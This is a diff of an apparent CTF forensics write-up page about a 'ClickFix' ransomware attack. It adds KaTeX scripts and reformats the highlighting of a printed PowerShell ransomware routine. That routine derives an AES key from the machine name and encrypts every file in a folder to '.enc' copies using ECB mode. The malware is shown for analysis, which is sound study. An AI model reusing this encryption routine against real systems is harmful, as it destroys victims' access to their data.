@@ -6,6 +6,17 @@
     <title>Forensic analysis of ClickFix Ransomware Attack | CTF Writeups</title>
     <link rel="icon" type="image/png" href="../assets/cursor.png">
     <link rel="stylesheet" href="../styles/style.css">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+        onload="renderMathInElement(document.body, {
+            delimiters: [
+                {left: '$$', right: '$$', display: true},
+                {left: '$', right: '$', display: false}
+            ],
+            throwOnError: false
+        });"></script>
 </head>
 <body>
     <header>
@@ -56,27 +67,27 @@ The script is typically an infostealer malware, but in this case, it's ransomwar
 <span class="o">}</span>
 <span class="nv">$computerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Environment<span class="o">]</span>::MachineName
 <span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$computerName</span>.Length<span class="w"> </span>-lt<span class="w"> </span><span class="m">16</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
-<span class="w">    </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$computerName</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;9&#39;</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="w"> </span>-<span class="w"> </span><span class="nv">$computerName</span>.Length<span class="o">))</span>
+<span class="w">    </span>$key = $computerName<span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;9&#39;</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="w"> </span>-<span class="w"> </span><span class="nv">$computerName</span>.Length<span class="o">))</span>
 <span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
-<span class="w">    </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$computerName</span>.Substring<span class="o">(</span><span class="m">0</span>,<span class="w"> </span><span class="m">16</span><span class="o">)</span>
+<span class="w">    </span>$key = $computerName.Substring<span class="o">(</span><span class="m">0</span>,<span class="w"> </span><span class="m">16</span><span class="o">)</span>
 <span class="o">}</span>
 Write-Host<span class="w"> </span><span class="s2">&quot;Key: </span><span class="nv">$key</span><span class="s2">&quot;</span>
-<span class="nv">$keyBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Text.Encoding<span class="o">]</span>::UTF8.GetBytes<span class="o">(</span><span class="nv">$key</span><span class="o">)</span>
-Write-Host<span class="w"> </span><span class="s2">&quot;Key Bytes: </span><span class="k">$(</span><span class="nv">$keyBytes</span><span class="w"> </span>-join<span class="w"> </span><span class="s1">&#39;, &#39;</span><span class="k">)</span><span class="s2">&quot;</span>
+$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key<span class="o">)</span>
+Write-Host<span class="w"> </span><span class="s2">&quot;Key Bytes: $($keyBytes -join &#39;, &#39;)&quot;</span>
 <span class="nv">$aesAlg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.Aes<span class="o">]</span>::Create<span class="o">()</span>
-<span class="nv">$aesAlg</span>.Key<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$keyBytes</span>
+$aesAlg.Key = $keyBytes
 <span class="nv">$aesAlg</span>.Mode<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.CipherMode<span class="o">]</span>::ECB
 <span class="nv">$aesAlg</span>.Padding<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.Security.Cryptography.PaddingMode<span class="o">]</span>::PKCS7
 Get-ChildItem<span class="w"> </span>-Path<span class="w"> </span><span class="nv">$folderPath</span><span class="w"> </span>-File<span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span>
-<span class="w">    </span><span class="nv">$filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_</span>.FullName
-<span class="w">    </span><span class="nv">$encryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesAlg</span>.CreateEncryptor<span class="o">(</span><span class="nv">$aesAlg</span>.Key,<span class="w"> </span><span class="nv">$null</span><span class="o">)</span>
+<span class="w">    </span>$filePath = $_.FullName
+<span class="w">    </span>$encryptor = $aesAlg.CreateEncryptor<span class="o">(</span>$aesAlg.Key, $null<span class="o">)</span>
 <span class="w">    </span><span class="nv">$cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.Cryptography.CryptoStream<span class="o">(</span>
 <span class="w">        </span><span class="o">[</span>System.IO.File<span class="o">]</span>::OpenWrite<span class="o">(</span><span class="nv">$filePath</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;.enc&quot;</span><span class="o">)</span>,
 <span class="w">        </span><span class="nv">$encryptor</span>,
 <span class="w">        </span><span class="o">[</span>System.Security.Cryptography.CryptoStreamMode<span class="o">]</span>::Write
 <span class="w">    </span><span class="o">)</span>
-<span class="w">    </span><span class="nv">$inputFileStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.IO.File<span class="o">]</span>::OpenRead<span class="o">(</span><span class="nv">$filePath</span><span class="o">)</span>
-<span class="w">    </span><span class="nv">$inputFileStream</span>.CopyTo<span class="o">(</span><span class="nv">$cryptoStream</span><span class="o">)</span>
+<span class="w">    </span>$inputFileStream = [System.IO.File]::OpenRead($filePath<span class="o">)</span>
+<span class="w">    </span>$inputFileStream.CopyTo($cryptoStream<span class="o">)</span>
 <span class="w">    </span><span class="nv">$cryptoStream</span>.FlushFinalBlock<span class="o">()</span>
 <span class="w">    </span><span class="nv">$cryptoStream</span>.Close<span class="o">()</span>
 <span class="w">    </span><span class="nv">$inputFileStream</span>.Close<span class="o">()</span>
